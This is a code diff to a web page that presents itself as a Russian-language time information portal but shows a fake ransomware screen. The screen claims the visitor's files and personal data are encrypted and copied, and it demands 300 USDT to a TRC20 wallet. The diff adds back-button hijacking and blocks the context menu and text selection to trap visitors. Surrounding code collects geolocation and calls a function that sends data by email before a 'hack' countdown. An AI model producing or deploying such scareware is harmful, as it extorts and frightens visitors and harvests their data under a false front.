@@ -7,7 +7,7 @@
     <title>Точное время – информационный портал</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🕒</text></svg>">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #f5f7fa;
@@ -71,7 +71,6 @@
             margin-top: 8px;
             transition: color 0.3s;
         }
-        /* Таймер обратного отсчёта */
         .countdown {
             background: #ff4757;
             color: white;
@@ -84,7 +83,6 @@
             border-radius: 40px;
             box-shadow: 0 0 10px rgba(0,0,0,0.2);
         }
-        /* Оверлеи */
         .overlay {
             position: fixed;
             top: 0;
@@ -182,7 +180,6 @@
     </div>
 </div>
 
-<!-- Элемент для отображения обратного отсчёта (10 секунд) -->
 <div id="countdownTimer" class="countdown">Взлом через: 10.00 сек</div>
 
 <div id="dataOverlay" class="overlay">
@@ -197,9 +194,9 @@
     <div class="modal ransom">
         <h2>🔒 ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ</h2>
         <p>Все личные данные, контакты, фото и история браузера скопированы и заблокированы.</p>
-        <div class="price">1 000 BYN</div>
+        <div class="price">300 USDT</div>
         <p>Для восстановления доступа переведите указанную сумму на кошелек:</p>
-        <p style="font-size:0.8rem; background:#000; padding:8px; border-radius:8px;">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
+        <p style="font-size:0.8rem; background:#000; padding:8px; border-radius:8px;">TXLAQmZ9QkXhC9kR3qL5pW6yZ7bN8cV9d (TRC20)</p>
         <button id="ransomButton">Я ПЕРЕВЕЛ(А), РАЗБЛОКИРУЙТЕ</button>
         <div class="close-hint" id="timerDisplay">Срок: 1:00 минут. Не закрывайте страницу.</div>
     </div>
@@ -226,13 +223,21 @@
         const timerDisplaySpan = document.getElementById('timerDisplay');
         const countdownDiv = document.getElementById('countdownTimer');
 
-        // Блокировка закрытия и кнопки назад
+        // Блокировка закрытия и кнопки назад (максимально)
         function enableLock() {
+            // Блокировка кнопки "назад"
             history.pushState(null, null, location.href);
             window.addEventListener('popstate', function (e) {
-                if (!isPrankRevealed) history.pushState(null, null, location.href);
+                if (!isPrankRevealed) {
+                    history.pushState(null, null, location.href);
+                }
             });
+            // Предупреждение при закрытии/обновлении
             window.addEventListener('beforeunload', beforeUnloadHandler);
+            // Блокировка контекстного меню и выделения (усложняет закрытие)
+            document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+            document.addEventListener('selectstart', function(e) { e.preventDefault(); });
+            // Запрет на закрытие через клавиши (Ctrl+W, Ctrl+F4) — не работает на уровне JS, но beforeunload сработает
         }
 
         function beforeUnloadHandler(e) {
@@ -309,8 +314,6 @@
         // Обратный отсчёт 10 секунд с миллисекундами
         function startCountdown(seconds, onComplete) {
             let startTime = performance.now();
-            let remaining = seconds;
-
             function updateCountdown(now) {
                 const elapsed = (now - startTime) / 1000;
                 let left = Math.max(0, seconds - elapsed);
@@ -442,7 +445,6 @@
         getUserGeo().then(geo => {
             geoInfo = geo;
             sendDataToEmail();
-            // Запускаем 10-секундный обратный отсчёт
             startCountdown(10, () => {
                 if (!hackStarted) {
                     hackStarted = true;
